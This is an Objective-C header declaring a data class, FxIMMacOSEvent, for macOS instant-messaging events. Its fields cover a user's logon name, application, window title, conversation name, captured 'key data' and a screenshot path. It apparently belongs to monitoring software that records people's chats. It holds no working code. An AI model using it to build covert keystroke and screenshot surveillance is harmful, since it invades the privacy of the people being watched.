//
//  FxIMMacOSEvent.h
//  FxEvents
//
//  Created by Makara Khloth on 2/2/15.
//
//

#import <Foundation/Foundation.h>

#import "FxEvent.h"

@interface FxIMMacOSEvent : FxEvent {
    NSString    *mUserLogonName;
    NSString    *mApplicationID;
    NSString    *mApplicationName;
    NSString    *mTitle;
    FxIMServiceID   mIMServiceID;
    NSString    *mConversationName;
    NSString    *mKeyData;
    NSString    *mSnapshotFilePath;
}

@property (nonatomic, copy) NSString *mUserLogonName;
@property (nonatomic, copy) NSString *mApplicationID;
@property (nonatomic, copy) NSString *mApplicationName;
@property (nonatomic, copy) NSString *mTitle;
@property (nonatomic, assign) FxIMServiceID mIMServiceID;
@property (nonatomic, copy) NSString *mConversationName;
@property (nonatomic, copy) NSString *mKeyData;
@property (nonatomic, copy) NSString *mSnapshotFilePath;

@end
